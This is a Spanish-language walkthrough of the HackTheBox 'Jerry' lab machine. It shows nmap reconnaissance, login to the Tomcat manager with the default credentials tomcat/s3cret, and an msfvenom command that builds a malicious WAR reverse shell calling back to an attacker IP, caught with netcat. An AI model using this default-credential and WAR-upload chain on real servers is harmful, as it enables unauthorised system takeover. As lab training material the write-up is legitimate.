---
layout: single
title: Máquina Jerry - HackTheBox (OSCP Style)
excerpt: "Resolución de la máquina Jerry, la cual figura en la plataforma con un nivel de dificultad Easy."
date: 2021-09-14
classes: wide
header:
  teaser: /assets/images/jerry-htb/portada.png
  teaser_home_page: true
categories:
  - HTB
  - Blog
tags:
  - Blog
  - Writeup
  - Guía
  - Walkthrough
---

+ **Información de la máquina**
	
	![0]

+ Verificamos que tengamos comunicación a la máquina por medio de una traza ICMP. Por el TTL deducimos que es una máquina Windows.

	![1]
	
+ Iniciamos la fase de reconocimiento con un escaneo rápido con ayuda de nmap en busca de puertos TCP abiertos.

	![2]
	
	El único puerto que está abierto es el 8080, característico de Tomcat.
	
+ Si ejecutamos un escaneo en busca de servicios y versiones para los puertos encontrados con ayuda de nmap, veremos que efectivamente, se trata de un servidor Tomcat.

	![3]
	
+ Fuzzeamos con el script **http-enum** de nmap en busca de directorios ocultos en el servidor web.

	![4]
	
	Encontramos los directorios típicos de un Tomcat, por lo que accedemos por medio de un navegador.
	
	![5]
	
+ El directorio **/manager/html** es la ruta para acceder al panel de administración de Tomcat, pero este pide credenciales válidas para acceder a dicho panel.

	![6]
	
	Como no las tenemos, hacemos clic en **Cancelar**.
	
+ Esta última acción genera un error bastante curioso en el sistema, y es que nos muestra una página web donde se nos indica que no tenemos permiso para acceder al recurso solicitado. Pero a la vez, nos muestra las credenciales por defecto que tiene un Tomcat recién instalado:

	```
		Usuario: tomcat
		Password: s3cret
	```
	
	![7]
	
+ Si volvemos a acceder al recurso, proporcionando estas credenciales, veremos que somos capaces de acceder al panel de administración de Tomcat.
	
	![8]
	
	![9]
	
+ Para comprometer un Tomcat, debemos cargar en el sistema un archivo **WAR** malicioso que nos devuelva una reverse shell. Para crear este archivo, nos valemos de msfvenom:

	``msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f war -o shell.war``

	![10]
	
	Este archivo debe ser subido dentro de la sección **"WAR file to deploy"**
	
	![11]
	
+ Una vez hagamos clic en **Deploy**, veremos el nuevo recurso desde el panel principal de Tomcat. Para entablarnos la reverse shell, solo debemos ponernos en escucha con netcat y hacer clic en el recurso.

	![12]

	![13]
	
	Como podemos observar, hemos logrado obtener acceso al sistema, y no solo eso, sino que lo hemos hecho como el usuario administrador del sistema.

+ De hecho, si nos ponemos a enumerar un poco el sistema, veremos que es el único usuario disponible:
	
	![14]
	
+ Dentro de su durectorio de trabajo, veremos una carpeta llamada flags, la cual en su interior contiene un archivo llamado **"2 for the price of 1.txt"**
	
	![15]
	
	![16]

+ Este último archivo contiene en su interior las dos flags, tanto la de user como la de root. ¡Vaya oferta! 2 flags por el precio de 1.

	![17]

[0]:/assets/images/active-htb/0.png
[1]:/assets/images/active-htb/1.png
[2]:/assets/images/active-htb/2.png
[3]:/assets/images/active-htb/3.png
[4]:/assets/images/active-htb/4.png
[5]:/assets/images/active-htb/5.png
[6]:/assets/images/active-htb/6.png
[7]:/assets/images/active-htb/7.jpg
[8]:/assets/images/active-htb/8.png
[9]:/assets/images/active-htb/9.png
[10]:/assets/images/active-htb/10.png
[11]:/assets/images/active-htb/11.png
[12]:/assets/images/active-htb/12.jpg
[13]:/assets/images/active-htb/13.png
[14]:/assets/images/active-htb/14.png
[15]:/assets/images/active-htb/15.png
[16]:/assets/images/active-htb/16.png
[17]:/assets/images/active-htb/17.jpg